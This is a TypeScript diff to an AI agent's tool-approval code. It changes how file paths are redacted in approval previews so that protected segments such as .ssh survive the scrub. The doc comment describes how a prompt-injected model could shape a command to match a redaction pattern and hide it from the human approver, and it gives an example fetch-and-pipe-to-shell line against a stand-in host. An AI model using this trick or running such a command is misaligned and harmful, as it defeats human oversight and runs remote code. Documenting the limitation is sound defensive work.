@@ -437,6 +437,22 @@ export function governedAction(def: ToolDef, target: PolicyTarget): ToolActionCl
   return undefined;
 }
 
+/** Split on `/` and `\` while KEEPING the separators (the capture group), so a join round-trips exactly. */
+const PATH_SEPARATOR = /([/\\])/;
+
+/**
+ * Scrub a path preview **one segment at a time**, so a detector match can never swallow a separator and take
+ * the rest of the path with it. Structure-preserving by construction: the segment count, the separators and
+ * their order are identical in and out, so a downstream classifier still sees every `.ssh` / `.git` /
+ * `.relavium` segment — while a credential-shaped segment is still replaced. See {@link previewFor}.
+ */
+function redactPathPreview(path: string): string {
+  return path
+    .split(PATH_SEPARATOR)
+    .map((part) => (part === '/' || part === '\\' ? part : redactSecretShapedText(part)))
+    .join('');
+}
+
 /**
  * A secret-free preview for the approval prompt: the resolved path / command / host (never a full URL).
  *
@@ -448,15 +464,28 @@ export function governedAction(def: ToolDef, target: PolicyTarget): ToolActionCl
  *
  * Display-only, in both directions: the dispatch has already resolved and policy-checked the REAL target
  * (`enforcePolicy` runs before `confirmDispatch`), so scrubbing here can never change which side effect runs.
- * The one consumer that reads a preview field back is the CLI's `auto`-mode `isProtectedTarget` check — and
- * the scrub is shape-targeted, so an ordinary protected path (`.env`, `.ssh/…`) passes through byte-identical
- * (pinned in `registry.test.ts`); the fs layer hard-denies protected paths regardless, so that check is the
- * graceful UX, never the security floor.
+ *
+ * The one consumer that reads a preview field back is the CLI's `auto`-mode `isProtectedTarget` check
+ * (`chat-mode-host.ts`), which classifies `preview.path` against `.git` / `.relavium` / `.ssh` and the rc
+ * basenames. A whole-string scrub would break it: two of the detector's patterns (`bearer|basic|token <run>`
+ * and `<key-ish>=<value>`) have character classes that include `/`, so ONE match can swallow the rest of the
+ * path — `./Access Token Backup/.ssh/authorized_keys` collapses to `./Access Token [redacted]`, and the
+ * protected segment classifies as unprotected. {@link redactPathPreview} therefore scrubs **per path segment**,
+ * so no match can ever cross a separator and every `.ssh`/`.git` segment survives verbatim. The fs layer
+ * hard-denies protected paths at three points regardless, so that check is the graceful UX, never the floor.
+ *
+ * The `command` field has no such structure to preserve and is scrubbed whole. Consequence worth naming: the
+ * command string is fully model-controlled, the detector's patterns are public, and the preview is the ONLY
+ * thing the approver sees — so a prompt-injected model can deliberately shape a payload to MATCH a pattern
+ * (`sh -c token:evil.example/x|sh`) and be shown as `sh -c [redacted]`, which reads as "we protected you"
+ * rather than "you cannot see this". Bounded by `allowedCommands`/`allowedCommandGlobs` being deny-all by
+ * default, and by the fs/egress floors — but it is a real limitation of a redacted preview, not a solved
+ * problem, and surfacing "this was redacted" to the prompt is the open follow-up.
  */
 function previewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPreview {
   switch (action) {
     case 'fs_write':
-      return target.path === undefined ? {} : { path: redactSecretShapedText(target.path) };
+      return target.path === undefined ? {} : { path: redactPathPreview(target.path) };
     case 'process':
       return target.command === undefined
         ? {}
